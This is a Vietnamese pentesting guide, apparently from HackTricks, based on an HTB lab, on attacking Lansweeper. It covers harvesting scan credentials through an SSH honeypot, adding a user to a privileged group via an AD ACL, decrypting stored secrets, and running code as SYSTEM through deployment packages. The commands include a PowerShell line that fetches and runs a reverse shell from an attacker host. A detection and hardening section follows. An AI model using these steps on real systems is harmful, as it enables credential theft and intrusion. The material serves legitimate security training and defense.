# Lạm dụng Lansweeper: Thu thập thông tin xác thực, giải mã secrets và RCE qua triển khai

{{#include ../../banners/hacktricks-training.md}}

Lansweeper là nền tảng khám phá và kiểm kê tài sản CNTT, thường được triển khai trên Windows và tích hợp với Active Directory. Các thông tin xác thực được cấu hình trong Lansweeper được các công cụ quét sử dụng để xác thực với tài sản qua những giao thức như SSH, SMB/WMI và WinRM. Các cấu hình sai thường cho phép:

- Chặn thông tin xác thực bằng cách chuyển hướng mục tiêu quét đến máy chủ do attacker kiểm soát (honeypot)
- Lạm dụng ACL của AD được các nhóm liên quan đến Lansweeper để lộ nhằm giành quyền truy cập từ xa
- Giải mã trực tiếp trên máy chủ các secrets được cấu hình trong Lansweeper (connection string và thông tin xác thực quét được lưu trữ)
- Thực thi mã trên các endpoint được quản lý qua tính năng Deployment (thường chạy với quyền SYSTEM)

Trang này tóm tắt các quy trình và lệnh thực tế mà attacker có thể dùng để khai thác những hành vi này trong quá trình kiểm thử.

## 1) Thu thập thông tin xác thực quét qua honeypot (ví dụ SSH)

Ý tưởng: tạo Scanning Target trỏ đến máy chủ của bạn và ánh xạ Scanning Credentials hiện có vào đó. Khi quá trình quét chạy, Lansweeper sẽ thử xác thực bằng các thông tin xác thực đó, còn honeypot của bạn sẽ thu thập chúng.<sup>[[1]](#references)</sup>

Tổng quan các bước (giao diện web):
- Scanning → Scanning Targets → Add Scanning Target
  - Type: IP Range (hoặc Single IP) = IP VPN của bạn
  - Cấu hình cổng SSH có thể truy cập được (ví dụ: 2022 nếu cổng 22 bị chặn)
  - Tắt lịch quét và dự định kích hoạt thủ công
- Scanning → Scanning Credentials → đảm bảo đã có thông tin xác thực Linux/SSH; ánh xạ chúng vào target mới (bật tất cả nếu cần)
- Nhấp “Scan now” trên target
- Chạy SSH honeypot và lấy username/password mà Lansweeper đã thử sử dụng

Ví dụ với sshesame:<sup>[[2]](#references)</sup>

```yaml
# sshesame.yaml
server:
  listen_address: 0.0.0.0:2022
```

```bash
# Prefer a current release/container; the package in Debian-derived repositories may be stale
sshesame -config sshesame.yaml

# Or run the maintained container image
docker run --rm -it -p 2022:2022 \
  -v "$PWD/sshesame.yaml:/config.yaml:ro" ghcr.io/jaksi/sshesame
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```

Xác thực creds đã thu thập được với các dịch vụ DC:

```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```

Ghi chú
- Các giao thức khác không tương đương: listener SMB/WinRM thường nhận được NTLM challenge-response thay vì mật khẩu dạng cleartext. Việc crack hoặc relay thông tin này phụ thuộc vào các cơ chế bảo vệ của giao thức đã thương lượng; xem [các cuộc tấn công đầu độc mạng và relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md). Xác thực bằng mật khẩu SSH thường là trường hợp cleartext đơn giản nhất.
- Xác thực bằng public key SSH để lộ username và fingerprint của public key cho server, **không phải** private key hoặc passphrase của nó. Hãy lấy lại thông tin xác thực dựa trên key từ server Lansweeper đã bị xâm nhập thay vì mong đợi honeypot tiết lộ chúng.<sup>[[2]](#references)</sup>
- Nhiều scanner tự nhận diện bằng client banner riêng (ví dụ: RebexSSH) và sẽ thử chạy các lệnh vô hại (uname, whoami, v.v.).

### Thứ tự chọn thông tin xác thực rất quan trọng

Khi rescan, Lansweeper trước tiên thử lại thông tin xác thực đã thành công gần nhất cho asset đó, tiếp theo là các thông tin xác thực được ánh xạ tường minh theo thứ tự đã cấu hình, rồi cuối cùng là thông tin xác thực toàn cục cùng loại. Honeypot chấp nhận lần xác thực bằng mật khẩu đầu tiên thường sẽ không thấy các thông tin xác thực dự phòng được thử sau đó; trong quá trình đánh giá đường đi của thông tin xác thực được ủy quyền, hãy ghi log và từ chối các lần thử nếu mục tiêu là xác minh toàn bộ chuỗi dự phòng.<sup>[[6]](#references)</sup>

## 2) AD ACL abuse: giành quyền truy cập từ xa bằng cách thêm chính bạn vào nhóm app-admin

Dùng BloodHound để liệt kê các quyền hiệu lực của tài khoản đã bị xâm nhập. Một phát hiện phổ biến là nhóm dành riêng cho scanner hoặc ứng dụng (ví dụ: “Lansweeper Discovery”) có quyền GenericAll đối với một nhóm đặc quyền (ví dụ: “Lansweeper Admins”). Nếu nhóm đặc quyền cũng là thành viên của “Remote Management Users”, WinRM sẽ khả dụng sau khi chúng ta thêm chính mình vào nhóm đó.<sup>[[1]](#references)[[5]](#references)</sup>

Ví dụ thu thập:

```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```

Exploit GenericAll trên nhóm bằng BloodyAD (Linux):<sup>[[4]](#references)</sup>

```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
  add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```

Sau đó, mở shell tương tác:

```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```

Mẹo: Các thao tác Kerberos phụ thuộc vào thời gian. Nếu gặp lỗi KRB_AP_ERR_SKEW, hãy đồng bộ thời gian với DC trước:

```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```

## 3) Giải mã các secret do Lansweeper cấu hình trên máy chủ

Trên máy chủ Lansweeper, trang ASP.NET thường lưu một chuỗi kết nối được mã hóa và một khóa đối xứng mà ứng dụng sử dụng. Với quyền truy cập cục bộ phù hợp, bạn có thể giải mã chuỗi kết nối DB rồi trích xuất thông tin xác thực quét đã lưu.<sup>[[1]](#references)</sup>

Các vị trí thường gặp:
- Cấu hình web: `C:\Program Files (x86)\Lansweeper\Website\web.config`
  - `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Khóa ứng dụng: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Dùng SharpLansweeperDecrypt để tự động giải mã và trích xuất thông tin xác thực đã lưu. Khi không có tham số, tệp thực thi hiện tại sẽ giải mã `web.config`, kết nối với cơ sở dữ liệu và trích xuất tất cả thông tin xác thực quét đã cấu hình; `-e` cũng hỗ trợ giải mã ngoại tuyến/thủ công khi đã có sẵn giá trị được mã hóa và tệp khóa:<sup>[[3]](#references)</sup>

```powershell
# Automatic: use the default web.config and Encryption.txt locations
.\SharpLansweeperDecrypt.exe

# Manual: decrypt one database value with an explicit key file
.\SharpLansweeperDecrypt.exe -e '<encrypted-base64-value>' `
  -p 'C:\Program Files (x86)\Lansweeper\Key\Encryption.txt'

# The repository also provides LansweeperDecrypt.ps1 when loading .NET tooling is unsuitable
powershell -ExecutionPolicy Bypass -File .\LansweeperDecrypt.ps1
```

Đầu ra dự kiến bao gồm thông tin kết nối DB và thông tin xác thực dạng plaintext của các tài khoản Windows và Linux được sử dụng trên toàn hệ thống. Những tài khoản này thường có quyền cục bộ nâng cao trên các máy chủ thuộc domain:

```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```

Sử dụng creds quét Windows đã khôi phục để truy cập đặc quyền:

```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```

## 4) Lansweeper Deployment → SYSTEM RCE

Là thành viên của “Lansweeper Admins”, bạn có thể truy cập Deployment và Configuration trên giao diện web. Trong Deployment → Deployment packages, bạn có thể tạo các package chạy lệnh tùy ý trên những asset được nhắm mục tiêu. Lansweeper dùng thông tin xác thực quét có quyền quản trị để truy cập Task Scheduler và `C$` trên mục tiêu, sau đó tạo một task cho deployment. Khi package sử dụng chế độ chạy **System Account**, payload sẽ chạy với quyền `NT AUTHORITY\SYSTEM`; các chế độ chạy khác có thể sử dụng thông tin xác thực quét đã ánh xạ hoặc người dùng hiện đang đăng nhập, vì vậy hãy xác minh chế độ đã chọn thay vì mặc định cho rằng đó là SYSTEM.<sup>[[1]](#references)[[7]](#references)</sup>

Các bước tổng quan:
- Tạo Deployment package mới để chạy một lệnh PowerShell hoặc cmd (reverse shell, add-user, v.v.).
- Chọn asset mong muốn (ví dụ: DC/host chạy Lansweeper) làm mục tiêu rồi nhấp Deploy/Run now.
- Nhận shell với quyền SYSTEM.

Payload mẫu (PowerShell):

```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```

OPSEC
- Các hành động triển khai gây nhiều tiếng động và để lại log trong Lansweeper và Windows event logs. Hãy sử dụng một cách thận trọng.

### Tạo tác vụ triển khai và một điểm lộ thông tin xác thực thứ hai

Scanner ghi executable triển khai vào `C:\Windows\LSDeployment` thông qua `C$`. Các tệp package thường được đọc từ `DefaultPackageShare$`, được lưu tại `C:\Program Files (x86)\Lansweeper\PackageShare`, hoặc từ package share dành riêng cho một dải IP. Điều quan trọng là Lansweeper ghi rõ thông tin xác thực của package share được lưu ở **dạng mã hóa có thể giải mã trong registry của mọi máy tính nhận triển khai**. Hãy xem endpoint được quản lý đã bị xâm nhập là một điểm có thể làm lộ tài khoản share đó, đồng thời kiểm tra thư mục triển khai, lịch sử scheduled task và các package share đã cấu hình khi tái dựng hoạt động của Lansweeper.<sup>[[7]](#references)</sup>

## Phát hiện và tăng cường bảo mật

- Hạn chế hoặc vô hiệu hóa việc liệt kê SMB ẩn danh. Giám sát RID cycling và hoạt động truy cập bất thường vào các share của Lansweeper.
- Kiểm soát lưu lượng đi ra: chặn hoặc hạn chế nghiêm ngặt SSH/SMB/WinRM đi ra từ các host scanner. Cảnh báo khi phát hiện các cổng không phổ biến (ví dụ: 2022) và các client banner bất thường như Rebex.
- Bảo vệ `Website\\web.config` và `Key\\Encryption.txt`. Chuyển secret sang vault và luân chuyển chúng khi bị lộ. Cân nhắc dùng service account với quyền tối thiểu và gMSA khi khả thi.
- Giám sát AD: cảnh báo khi có thay đổi đối với các group liên quan đến Lansweeper (ví dụ: “Lansweeper Admins”, “Remote Management Users”) và khi có thay đổi ACL cấp quyền GenericAll/Write đối với membership của các group đặc quyền.
- Kiểm tra việc tạo/thay đổi/thực thi package Deployment và đối chiếu scheduled task từ xa mới với các thao tác ghi vào `C:\Windows\LSDeployment`; cảnh báo khi package khởi chạy `cmd.exe`/`powershell.exe` hoặc tạo kết nối đi ra bất thường.
- Chỉ cấp cho thông tin xác thực package share quyền **Read & Execute** và tuyệt đối không dùng lại chúng cho mục đích quản trị. Khi khả thi, ưu tiên kiểm kê dựa trên agent: nếu tất cả máy tính đều được quét bằng agent và không sử dụng module deployment, Lansweeper không yêu cầu lưu thông tin xác thực quét máy tính.<sup>[[6]](#references)[[7]](#references)</sup>

## Chủ đề liên quan
- [Liệt kê SMB/LSA/SAMR và RID cycling](../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md)
- [Xác thực Kerberos và các lưu ý về clock-skew](kerberos-authentication.md)
- [Phân tích đường dẫn BloodHound](bloodhound.md)
- [Sử dụng WinRM và di chuyển ngang](../lateral-movement/winrm.md)



## References
- [1] [HTB: Sweep — Khai thác Lansweeper Scanning, AD ACL và secret để chiếm quyền Domain Controller (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [2] [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [3] [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [4] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [5] [BloodHound CE](https://github.com/SpecterOps/BloodHound)
- [6] [Tạo và ánh xạ thông tin xác thực quét — Lansweeper Classic](https://docs.lansweeper.com/classic/docs/create-and-map-scanning-credentials)
- [7] [Yêu cầu triển khai — Lansweeper Classic](https://docs.lansweeper.com/classic/docs/deployment-requirements)
{{#include ../../banners/hacktricks-training.md}}
